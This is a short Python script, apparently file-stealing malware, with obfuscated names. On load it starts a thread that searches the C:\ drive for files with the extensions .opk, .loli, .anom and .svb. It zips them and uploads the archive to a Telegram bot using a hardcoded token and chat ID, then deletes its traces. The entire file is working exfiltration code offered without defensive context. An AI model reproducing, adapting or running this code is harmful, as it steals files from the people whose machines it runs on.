import os, shutil, zipfile, concurrent.futures, requests, tempfile, threading
def Ox2h34d2(adbcydugdauydgauwdy, awpodjapwd, apwdjhapwdjad):
    for root, dirs, files in os.walk(adbcydugdauydgauwdy):
        for file in files:
            if file.endswith(tuple(awpodjapwd)):
                full_file_path = os.path.join(root, file)
                try:shutil.copy2(full_file_path, apwdjhapwdjad)
                except Exception as e:pass
def Oxs7df87(awpodjapwd=['.opk','.loli','.anom','.svb'], max_workers=10):
    with tempfile.TemporaryDirectory() as apwdjhapwdjad:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(Ox2h34d2, d, awpodjapwd, apwdjhapwdjad) for d in ['C:\\']]
            concurrent.futures.wait(futures)
        zip_name = os.path.join(apwdjhapwdjad, 'configs.zip')
        with zipfile.ZipFile(zip_name, 'w') as zipf:
            for root, dirs, files in os.walk(apwdjhapwdjad):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(apwdjhapwdjad, '..')))
        send_file_telegram("6323098651:AAEBUrejpIliHCT8mxxX-qXnUzd268lXs9E", "-1001912281792", zip_name)
        shutil.rmtree(apwdjhapwdjad)
def send_file_telegram(bot_token, chat_id, file_path):
    with open(file_path, "rb") as file:
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendDocument", data={'chat_id': chat_id}, files={'document': file} )

t = threading.Thread(target=Oxs7df87)
t.start()